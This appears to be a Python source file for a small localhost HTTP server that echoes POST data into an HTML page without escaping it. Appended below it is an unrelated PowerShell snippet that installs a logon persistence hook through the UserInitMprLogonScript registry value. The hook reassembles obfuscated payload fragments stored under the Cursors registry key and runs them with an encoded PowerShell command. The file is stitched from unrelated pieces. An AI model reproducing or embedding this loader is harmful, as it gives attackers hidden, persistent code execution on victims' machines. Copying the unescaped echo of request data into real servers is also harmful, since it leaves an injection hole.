import http.server
import socketserver

PORT = 8080
hostName = "localhost"

class MyServer(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Read the request body
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Write response
        self.wfile.write(bytes("<html><head><title>POST Response</title></head>", "utf-8"))
        self.wfile.write(bytes("<body>", "utf-8"))
        self.wfile.write(bytes("<p>Request: %s</p>" % post_data, "utf-8"))
        self.wfile.write(bytes("<p>This is an example web server.</p>", "utf-8"))
        self.wfile.write(bytes("</body></html>", "utf-8"))
        
        # Print to console
        print(f"Server received POST request at {self.path}")
        print(f"Data received: {post_data}")

if __name__ == "__main__":
    webServer = socketserver.TCPServer((hostName, PORT), MyServer)
    print(f"Server started http://{hostName}:{PORT}")
    
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    
    webServer.server_close()
    print("Server stopped.")



$envRegPath = "HKCU:\Environment"
$loaderCommand = '$frag1=[Get-ItemProperty -Path HKCU:\Cursors -Name nLzTvI0bImeIeqyxHxTJ]."nLzTvI0bImeIeqyxHxTJ"; $frag2=[Get-ItemProperty -Path HKCU:\Cursors -Name pQzUwJ1cKnfLerzxGyUK]."pQzUwJ1cKnfLerzxGyUK"; $frag3=[Get-ItemProperty -Path HKCU:\Cursors -Name rMxVwL2dMogPfsayIzVL]."rMxVwL2dMogPfsayIzVL"; $encoded=$frag1 + $frag2 + $frag3; powershell.exe -enc $encoded'
Set-ItemProperty -Path $envRegPath -Name "UserInitMprLogonScript" -Value $loaderCommand
